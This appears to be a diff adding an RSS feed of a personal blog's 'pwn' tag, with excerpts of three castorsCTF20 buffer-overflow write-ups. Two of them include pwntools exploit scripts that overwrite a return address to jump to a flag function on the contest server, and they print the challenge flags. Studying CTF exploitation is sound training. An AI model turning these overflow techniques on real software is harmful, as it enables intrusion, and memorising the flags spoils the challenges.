@@ -1,0 +1,46 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>pwn on Blog</title>
+    <link>/tags/pwn/</link>
+    <description>Recent content in pwn on Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>Ahmed Selim Üzüm</copyright>
+    
+	<atom:link href="/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>abcbof</title>
+      <link>/writups/castorsctf20/abcbof/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/abcbof/</guid>
+      <description>The executable file wants a password from us. So let&amp;rsquo;s see if it uses strcmp for comparing it. If that, and the text isn&amp;rsquo;t encyripted we should able to see the password. So let&amp;rsquo;s run ltrace ./abcbof and give aaaa for password. Here is the password! But when we tried it, it didn&amp;rsquo;t work.
+We can use ghidra for seeing why it didn&amp;rsquo;t work.
+undefined8 main(void) { int iVar1; char local_118 [256]; char local_18 [16]; printf(&amp;#34;Hello everyone, say your name: &amp;#34;); gets(local_118); iVar1 = strcmp(&amp;#34;CyberCastors&amp;#34;,local_18); if (iVar1 == 0) { get_flag(); } puts(&amp;#34;You lose!</description>
+    </item>
+    
+    <item>
+      <title>babybof1</title>
+      <link>/writups/castorsctf20/babybof1/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/babybof1/</guid>
+      <description>With radare2 we can see there is a get_flag function so let&amp;rsquo;s ROP it!
+from pwn import * flag_addr = 0x004006e7 p = remote(&amp;#34;chals20.cybercastors.com&amp;#34;, 14425) p.recvuntil(&amp;#34;Babybof&amp;#34;) padding = &amp;#34;A&amp;#34; * cyclic_find(b&amp;#34;qaacraac&amp;#34;) print(padding + p64(flag_addr)) p.sendline(padding + p64(flag_addr)) p.interactive() Flag: castorsCTF{th4t&#39;s_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}</description>
+    </item>
+    
+    <item>
+      <title>babybof2</title>
+      <link>/writups/castorsctf20/babybof2/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/babybof2/</guid>
+      <description>With same strategy as babybof1 we can get the flag
+from pwn import * winnersLevel_addr = 0x08049196 param_1 = 0x182 #p = process(&amp;#34;./winners&amp;#34;) p = remote(&amp;#34;chals20.cybercastors.com&amp;#34;, 14434) padding = &amp;#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;#34; payload = padding + p32(winnersLevel_addr) + &amp;#34;CCCC&amp;#34; + p32(param_1) p.sendline(payload) print(payload) p.interactive() Flag: castorsCTF{b0F_s_4r3_V3rry_fuN_4m_l_r1ght}</description>
+    </item>
+    
+  </channel>
+</rss>
